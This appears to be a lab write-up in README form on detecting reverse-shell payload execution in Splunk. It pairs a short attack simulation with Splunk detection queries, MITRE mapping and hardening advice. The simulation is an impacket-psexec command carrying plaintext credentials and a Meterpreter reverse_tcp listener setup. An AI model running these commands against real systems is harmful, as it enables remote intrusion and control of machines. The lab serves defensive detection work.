# 🛡️ Detection Engineering Lab: Malicious Payload Execution & Reverse Shell Detection — The "Liquid Gold" Playbook

![MITRE](https://img.shields.io/badge/MITRE-T1059-red)
![Technique](https://img.shields.io/badge/Technique-Reverse%20Shell%20Execution-blue)
![Platform](https://img.shields.io/badge/Platform-Windows-orange)
![SIEM](https://img.shields.io/badge/SIEM-Splunk-green)
![Status](https://img.shields.io/badge/Detection-Working-success)

---

# 📌 Project Overview

Executing a custom malicious binary is a **critical step** in an attack lifecycle.

This lab demonstrates how attackers:

- Execute malicious payloads remotely
- Establish reverse shell connections
- Gain persistent remote control
- Maintain full system access

We simulate a **reverse shell payload execution** and build **Splunk detections** to hunt for this activity.

---

## 🧪 Lab Architecture
```
Kali Linux (Attacker)
│
│ Impacket-PSExec
▼
Windows Target System
│
│ Executes shell.exe
▼
Reverse Connection
│
▼
Metasploit Listener
│
▼
Meterpreter Session 🚨

```

---

## ⚔️ Phase 1: Attack Simulation (Payload Execution)

In this scenario, the attacker remotely executes a malicious binary:

```
shell.exe
```

This binary initiates a **reverse shell**, allowing the attacker to bypass inbound firewall rules.

---

## 💻 Attack Execution

Executed from Kali Linux:

```bash
# Executing malicious payload remotely
impacket-psexec abhay:CB@i510400f@10.193.10.80 "C:\Users\abhay\Desktop\shell.exe"
```

---
## 🎣 Reverse Shell Setup

On the attacker machine:

Listener configured using Metasploit.
```bash
Reverse Shell Configuration
Payload: windows/x64/meterpreter/reverse_tcp
LHOST : 10.193.10.231
LPORT : 4444

```

---
## ✅ Result
Meterpreter session 1 opened

- ✔️ Reverse connection established
- ✔️ Remote control achieved
- ✔️ Target compromised

---
## 📂 Phase 2: Data Decoder (Field Mapping)

To detect malicious execution, normalize Windows Security and Sysmon logs.

## 🧩 Field Normalization Mapping

|Information |Windows 4688 |Sysmon 1	|Universal Alias |
|------------|-------------|----------|----------------|
|Payload File	|New_Process_Name	|Image	|PayloadName |
|Parent Process	|Creator_Process_Name	|ParentImage	|Parent |
|Command Path	|Process_Command_Line	|CommandLine	|ExecPath |

---
## 🏆 Phase 3: High-Fidelity Detection (Splunk)

We detect:

- 1️⃣ Specific payload execution
- 2️⃣ Suspicious parent process execution

---
## 🔍 Detection Query 1 — Specific Payload Hunt

Detect execution of shell.exe.
```spl
index=* (EventCode=4688 OR EventCode=1)

New_Process_Name="*shell.exe"

| table _time,
         Account_Name,
         New_Process_Name,
         Creator_Process_Name

```
---
## 💎 Detection Query 2 — Universal Execution Hunter

Detect execution via Windows service (common PSExec behavior).
```spl
index=* (EventCode=4688 OR EventCode=1)

| eval Parent = coalesce(Creator_Process_Name,
                         ParentImage,
                         ParentProcessName)

| eval Child  = coalesce(New_Process_Name,
                         Image,
                         NewProcessName)

| search Parent="*services.exe"
        AND Child="*shell.exe"

| table _time,
         Account_Name,
         Parent,
         Child

```

---
## 📊 Phase 4: Lab Observations

Splunk dashboard:
```
payload_execution_detection
```
Captured malicious activity successfully.

---
## 🔎 Observed Event

|Field	|Value |
|Time	|14:52:19 |
|Payload	|shell.exe |
|Parent	|services.exe |
|Execution Type	|Service-based |

---
## 🚨 Key Evidence
```
services.exe → shell.exe
```
Indicates:

- ✔️ Service-based execution
- ✔️ Likely PSExec usage
- ✔️ Suspicious payload activity

---
## 🛠️ Phase 5: Advanced Hunting Tips

Improve detection visibility.

## 1️⃣ Correlate With Logon Events

Check:
```
Event ID 4624
Logon Type 3
```
Confirms:

- ✔️ Remote execution origin

---
## 2️⃣ Hunt Reverse Network Connections

Search Sysmon Event ID:
```
Event ID 3
```
Detection Query:
```spl
index=* EventCode=3

Image="*shell.exe"

| table _time,
         Image,
         DestinationIp,
         DestinationPort

```

---
## 3️⃣ Enable Process Logging

Run:
```bash
auditpol /set /subcategory:"Process Creation" /success:enable

```

---
## 🗺️ MITRE ATT&CK Mapping

|Technique	|ID	|Description |
|-----------|---|------------|
|Command Execution	|T1059	|Execute commands |
|Ingress Tool Transfer	|T1105	|Upload malicious payload |
|Remote Services	|T1021	|Lateral movement |
|Reverse Shell	|T1071	|Command and control |

---
## 🚩 Indicators of Compromise (IOCs)

Look for:

- ⚠️ Execution of unknown binaries
- ⚠️ .exe files in user directories
- ⚠️ Reverse network connections
- ⚠️ Service-based process launches

---
## 🛡️ Defensive Recommendations

Strengthen endpoint defenses:

- ✔️ Restrict outbound ports (4444, 8080, 1337)
- ✔️ Enable application whitelisting
- ✔️ Deploy AppLocker or WDAC
- ✔️ Monitor new service creation (Event 7045)
- ✔️ Alert on unknown executables

---
## 🧠 Key Takeaway

Execution of unknown binaries followed by outbound connections is a strong indicator of reverse shell compromise.

Combining:

- ✔️ Process monitoring
- ✔️ Service detection
- ✔️ Network logging

Creates high-confidence detection coverage.

---
## 🏁 Lab Conclusion

By analyzing:

- ✔️ Malicious payload execution
- ✔️ Service-based process creation
- ✔️ Reverse network connections

We successfully built a detection strategy capable of identifying reverse shell activity in enterprise environments.

---
## ✍️ Author

Abhay

🔐 Detection Engineering
🧠 Threat Hunting
📊 SIEM Engineering

---
